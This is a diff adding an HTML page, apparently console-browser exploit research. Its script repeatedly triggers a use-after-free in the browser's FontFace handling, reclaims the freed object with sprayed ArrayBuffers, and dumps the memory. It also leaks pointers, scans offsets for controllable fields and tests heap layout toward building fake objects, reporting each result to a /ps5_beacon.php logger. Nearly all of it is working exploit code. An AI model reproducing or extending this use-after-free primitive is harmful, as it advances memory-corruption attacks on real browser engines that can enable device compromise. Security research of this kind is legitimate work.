@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>P844v13</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#111;color:#0f0;font:11px/1.4 monospace;padding:8px;overflow-y:auto}
+#log{white-space:pre-wrap;word-break:break-all}
+</style>
+</head>
+<body>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(s){L.textContent+=s+'\n';}
+function bn(tag,data){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/ps5_beacon.php?tag='+encodeURIComponent(tag)+'&data='+encodeURIComponent(data||''),false);
+    x.send();
+  }catch(e){}
+}
+var KEY='p844v13_test';
+function getTest(){try{return parseInt(localStorage.getItem(KEY))||0;}catch(e){return 0;}}
+function setTest(n){try{localStorage.setItem(KEY,String(n));}catch(e){}}
+function clearTest(){try{localStorage.removeItem(KEY);}catch(e){}}
+var testNum=getTest();
+log('P844v13 BOOT test='+testNum);
+bn('P844v13-BOOT','test='+testNum);
+
+function doUAF(id,cb){
+  var st=document.createElement('style');
+  st.textContent="@font-face{font-family:'UAF"+id+"';src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(st);
+  var face=new FontFace('UAF'+id+'F',"local('Helvetica')",{unicodeRange:'U+0041'});
+  document.fonts.add(face);void face.loaded;
+  var fabs=[],ffired=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){if(ffired)return undefined;ffired=true;
+      st.remove();st.textContent='';st=null;
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      fabs=[];for(var i=0;i<80;i++)fabs.push(new ArrayBuffer(192));
+      document.body.offsetHeight;
+      return undefined;
+    },set:function(){}});
+  document.fonts.load('1em UAF'+id+'F,UAF'+id,'AB').then(function(){}).catch(function(){});
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var hi=-1,bv=null;
+    for(var i=0;i<fabs.length;i++){var t=new BigUint64Array(fabs[i]);if(t[0]!==0n||t[11]!==0n){hi=i;bv=t;break;}}
+    cb(bv?{abs:fabs,bv:bv,face:face,hitIdx:hi}:null);
+  },500);
+}
+function fin(tag,data){bn(tag,data);log(tag.replace('P844v13-','')+': '+data);setTimeout(function(){location.reload();},100);}
+
+var TESTS=[
+// T0: BASELINE + read ALL face properties after UAF
+// CRITICAL: if face.family reads from our AB (not cached) -> arbitrary read path
+function(){
+  setTest(1);
+  doUAF('T0',function(r){
+    if(!r)return fin('P844v13-T0-OK','uaf=miss');
+    var q0=r.bv[0],q11=r.bv[11],q13=r.bv[13];
+    var f=r.face,o=[];
+    o.push('q0=0x'+q0.toString(16));
+    o.push('q11=0x'+q11.toString(16));
+    o.push('q13=0x'+q13.toString(16));
+    var props=['family','style','weight','unicodeRange','display','variant','stretch','featureSettings','status'];
+    for(var i=0;i<props.length;i++){
+      try{var v=f[props[i]];o.push(props[i]+'='+typeof v+':'+String(v).substring(0,40));}
+      catch(e){o.push(props[i]+'=ERR:'+e.message.substring(0,25));}
+    }
+    try{var ld=f.loaded;o.push('loaded='+(ld&&ld.then?'promise':'val:'+typeof ld));}
+    catch(e){o.push('loaded=ERR');}
+    fin('P844v13-T0-OK',o.join('|'));
+  });
+},
+
+// T1: Write-read scan for face.status
+// Write value 2 ("loaded") at each 4-byte offset, check if face.status changes
+function(){
+  setTest(2);
+  doUAF('T1',function(r){
+    if(!r)return fin('P844v13-T1-OK','uaf=miss');
+    var f=r.face,u32=new Uint32Array(r.abs[r.hitIdx]);
+    var init='?';
+    try{init=f.status;}catch(e){init='ERR';}
+    var found=[];
+    for(var off=0;off<48;off++){
+      var orig=u32[off];
+      u32[off]=2;
+      try{var st=f.status;if(st!==init)found.push(off*4+'->'+st);}
+      catch(e){found.push(off*4+'->CRASH');}
+      u32[off]=orig;
+    }
+    fin('P844v13-T1-OK','init='+init+'|found='+(found.join(',')||'none'));
+  });
+},
+
+// T2: Write-read scan for face.family
+// Write different values at each qword offset, check if face.family changes
+function(){
+  setTest(3);
+  doUAF('T2',function(r){
+    if(!r)return fin('P844v13-T2-OK','uaf=miss');
+    var f=r.face,bv=r.bv;
+    var init='?';
+    try{init=f.family;}catch(e){init='ERR:'+e.message.substring(0,25);}
+    var found=[];
+    // Write sentinel 0xDEADn at each qword, check family
+    for(var qi=0;qi<24;qi++){
+      var orig=bv[qi];
+      bv[qi]=0xDEAD0000DEADn;
+      try{var fam=f.family;if(fam!==init)found.push('q'+qi+'='+typeof fam+':'+String(fam).substring(0,20));}
+      catch(e){found.push('q'+qi+'=CRASH:'+e.message.substring(0,15));}
+      bv[qi]=orig;
+    }
+    fin('P844v13-T2-OK','init='+String(init).substring(0,40)+'|found='+(found.join(',')||'none'));
+  });
+},
+
+// T3: Canvas measureText before/after UAF
+function(){
+  setTest(4);
+  var st=document.createElement('style');
+  st.textContent="@font-face{font-family:'UAFT3';src:local(Arial);unicode-range:U+0041-007A;}";
+  document.head.appendChild(st);
+  var face=new FontFace('UAFT3F',"local('Helvetica')",{unicodeRange:'U+0041-007A'});
+  document.fonts.add(face);
+  var cvs=document.createElement('canvas');cvs.width=400;cvs.height=50;
+  document.body.appendChild(cvs);
+  var ctx=cvs.getContext('2d');
+  ctx.font='48px UAFT3,UAFT3F,monospace';
+  var bW=-1;try{bW=ctx.measureText('ABCDEF').width;}catch(e){bW=-999;}
+  void face.loaded;var fabs=[],ffired=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){if(ffired)return undefined;ffired=true;
+      st.remove();st.textContent='';st=null;
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      fabs=[];for(var i=0;i<80;i++)fabs.push(new ArrayBuffer(192));
+      document.body.offsetHeight;return undefined;
+    },set:function(){}});
+  document.fonts.load('1em UAFT3F,UAFT3','AB').then(function(){}).catch(function(){});
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var hit=false;
+    for(var i=0;i<fabs.length;i++){var t=new BigUint64Array(fabs[i]);if(t[0]!==0n){hit=true;break;}}
+    var aW=-1;try{aW=ctx.measureText('ABCDEF').width;}catch(e){aW=-999;}
+    ctx.clearRect(0,0,400,50);ctx.fillStyle='#fff';
+    try{ctx.fillText('ABCDEF',0,40);}catch(e){}
+    var pix=0;
+    try{var id=ctx.getImageData(0,0,400,50);for(var j=0;j<id.data.length;j+=4)if(id.data[j]>0)pix++;}catch(e){pix=-1;}
+    fin('P844v13-T3-OK','uaf='+(hit?'hit':'miss')+'|before='+bW+'|after='+aW+'|pixels='+pix+'|delta='+(aW-bW));
+  },500);
+},
+
+// T4: face.load() after UAF — does it crash (dereference m_backing)?
+function(){
+  setTest(5);
+  doUAF('T4',function(r){
+    if(!r)return fin('P844v13-T4-OK','uaf=miss');
+    var f=r.face,o=[];
+    try{var p=f.load();o.push('load=ok');
+      p.then(function(){o.push('resolved');}).catch(function(e){o.push('rej:'+e.message.substring(0,30));});
+    }catch(e){o.push('load=ERR:'+e.message.substring(0,30));}
+    setTimeout(function(){fin('P844v13-T4-OK',o.join('|'));},600);
+  });
+},
+
+// T5: GC test — drop face ref, trigger GC, check if AB was modified
+// If FontFace destructor writes through dangling CSSFontFace pointer, AB changes
+function(){
+  setTest(6);
+  doUAF('T5',function(r){
+    if(!r)return fin('P844v13-T5-OK','uaf=miss');
+    var snap=new BigUint64Array(24);
+    for(var i=0;i<24;i++)snap[i]=r.bv[i];
+    r.face=null;
+    var junk=[];
+    for(var i=0;i<300000;i++)junk.push({x:i,y:String(i)});
+    junk=null;
+    for(var i=0;i<300000;i++){var z={x:i};}
+    var changed=[];
+    for(var i=0;i<24;i++){
+      if(r.bv[i]!==snap[i])changed.push('q'+i+':0x'+snap[i].toString(16)+'->0x'+r.bv[i].toString(16));
+    }
+    fin('P844v13-T5-OK','changed='+(changed.join(',')||'none'));
+  });
+},
+
+// T6: Full 192B hex dump of reclaimed CSSFontFace
+// Map every non-zero qword to identify all live fields
+function(){
+  setTest(7);
+  doUAF('T6',function(r){
+    if(!r)return fin('P844v13-T6-OK','uaf=miss');
+    var nz=[];
+    for(var i=0;i<24;i++){
+      if(r.bv[i]!==0n)nz.push('q'+i+'=0x'+r.bv[i].toString(16));
+    }
+    // Also dump as u32 for fine-grained view
+    var u32=new Uint32Array(r.abs[r.hitIdx]);
+    var nz32=[];
+    for(var i=0;i<48;i++){
+      if(u32[i]!==0)nz32.push('+'+i*4+'=0x'+u32[i].toString(16));
+    }
+    fin('P844v13-T6-OK','qwords='+nz.join(',')+'|dwords='+nz32.join(','));
+  });
+},
+
+// T7: Spray contiguity test — do two UAFs, check address distance
+// If spray ABs are contiguous, we can predict addresses for fake objects
+function(){
+  setTest(8);
+  doUAF('T7a',function(r1){
+    if(!r1)return fin('P844v13-T7-OK','uaf1=miss');
+    var self1=r1.bv[11]-BigInt(0x58);
+    var idx1=r1.hitIdx;
+    // Second UAF in same page (different font names)
+    doUAF('T7b',function(r2){
+      if(!r2)return fin('P844v13-T7-OK','uaf2=miss|self1=0x'+self1.toString(16)+'|idx1='+idx1);
+      var self2=r2.bv[11]-BigInt(0x58);
+      var idx2=r2.hitIdx;
+      var dist=self2>self1?Number(self2-self1):Number(-(self1-self2));
+      fin('P844v13-T7-OK','self1=0x'+self1.toString(16)+'|self2=0x'+self2.toString(16)+'|dist='+dist+'|idx1='+idx1+'|idx2='+idx2);
+    });
+  });
+}
+];
+
+var NAMES=['T0-faceProps','T1-statusScan','T2-familyScan','T3-canvasMeasure','T4-faceLoad','T5-gcTest','T6-hexDump','T7-sprayDist'];
+
+function runTest(){
+  if(testNum>=TESTS.length){
+    log('ALL '+TESTS.length+' TESTS COMPLETE');
+    bn('P844v13-DONE','all='+TESTS.length);
+    clearTest();return;
+  }
+  log('Running '+NAMES[testNum]+'...');
+  try{TESTS[testNum]();}catch(e){
+    bn('P844v13-'+NAMES[testNum]+'-ERR',e.message);
+    setTest(testNum+1);setTimeout(function(){location.reload();},100);
+  }
+}
+setTimeout(runTest,200);
+</script>
+</body>
+</html>
